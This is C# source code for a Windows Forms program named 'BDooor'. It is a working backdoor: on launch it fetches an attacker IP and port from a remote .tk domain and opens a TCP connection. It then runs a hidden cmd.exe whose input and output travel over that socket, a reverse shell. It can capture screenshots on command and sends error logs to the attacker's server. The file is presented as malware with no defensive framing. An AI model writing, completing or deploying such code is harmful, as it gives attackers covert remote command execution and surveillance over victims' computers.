using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Http;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace BDooor
{

	public partial class Form1 : Form
	{
		public static string _ip;
		public static int _po ;
		TcpClient client;
		HttpClient _httpClient = new HttpClient();
		string _url = "https://dip.hyutygdfs4.tk/";

		public Form1()
        {
            InitializeComponent();

			StreamTCP();
        }

        public void do_ScreenShot()
        {
            Rectangle ScreenBounds = Screen.FromControl(this).Bounds;
            Bitmap captureBitmap = new Bitmap(ScreenBounds.Width, ScreenBounds.Height, PixelFormat.Format32bppArgb);
            Rectangle captureRectangle = Screen.AllScreens[0].Bounds;
            Graphics captureGraphics = Graphics.FromImage(captureBitmap);
            captureGraphics.CopyFromScreen(captureRectangle.Left, captureRectangle.Top, 0, 0, captureRectangle.Size);
            captureBitmap.Save(Path.GetTempPath()+@"\xapture.jpg", ImageFormat.Jpeg);
			
        }
		public void do_SendFile()
        {
            
			
        }

		private async Task GetIp()
		{
			try{
				HttpResponseMessage response = await _httpClient.GetAsync(_url+"e.txt");
				response.EnsureSuccessStatusCode();
				string htmlG = await response.Content.ReadAsStringAsync();
				string[] splitIpPort = htmlG.Split(':');
				_ip = splitIpPort[0];
				_po = Int32.Parse(splitIpPort[1]);
			}catch(Exception jd) { 
					await _httpClient.GetAsync(_url + "?loog=GetIp():; " + jd.Message);
			}
		}

        //## netCat payload 2
		static StreamWriter streamWriter;
		public async void StreamTCP()
		{

			while (true) { 
				try {
					await GetIp();
					//#start tcp connection
					client = new TcpClient(_ip, _po);
					using (Stream stream = client.GetStream()){
						using (StreamReader rdr = new StreamReader(stream)){
							streamWriter = new StreamWriter(stream);


							Process p = new Process();
							p.StartInfo.FileName = "cmd.exe";
							p.StartInfo.CreateNoWindow = true;
							p.StartInfo.UseShellExecute = false;
							p.StartInfo.RedirectStandardOutput = true;
							p.StartInfo.RedirectStandardInput = true;
							p.StartInfo.RedirectStandardError = true;
							p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputData);
							p.Start();
							p.BeginOutputReadLine();

							string tcpInput = "";
							while (true){
								tcpInput = rdr.ReadLine();//get tcp input

								p.StandardInput.WriteLine(LlTcpInput(tcpInput));//execute tcp input
								tcpInput = "";//clear previous strInput
							}
						}
					}
				}catch(Exception gf){
					Thread.Sleep(1342);
					//#GET request to _url log
					await _httpClient.GetAsync(_url + "?loog=StreamTCP():; " + gf.Message);
				}
			}
		}
		//## netCat payload 1
		private async void CmdOutputData(object sendingProcess, DataReceivedEventArgs outLine){
			StringBuilder strOutput = new StringBuilder();

			if (!String.IsNullOrEmpty(outLine.Data)){
				try{
					streamWriter.WriteLine(outLine.Data);
					streamWriter.Flush();
				}catch (Exception err) {
					//#GET request to _url log
					await _httpClient.GetAsync(_url + "?loog=CmdOutputData():; " + err.Message);
				}
			}
		}
		//## netCat payload 0

		public  string LlTcpInput(string wodr)
		{
			string cmdCommand = wodr;
			switch (wodr)
			{
				case "??":
				case "-hep":
					cmdCommand = "echo \"[??|-hep] [-Screenshot] [-dload?download]\"";
					break;
				case "-screenshot":
					do_ScreenShot();
					cmdCommand = "echo \"screenshot captured..\"";
					break;
				case "-dload":
					cmdCommand = "echo \"[??|-hep] [ls] [-Screenshot]\"";
					break;
			}
			
			return cmdCommand;
		}
	}

}
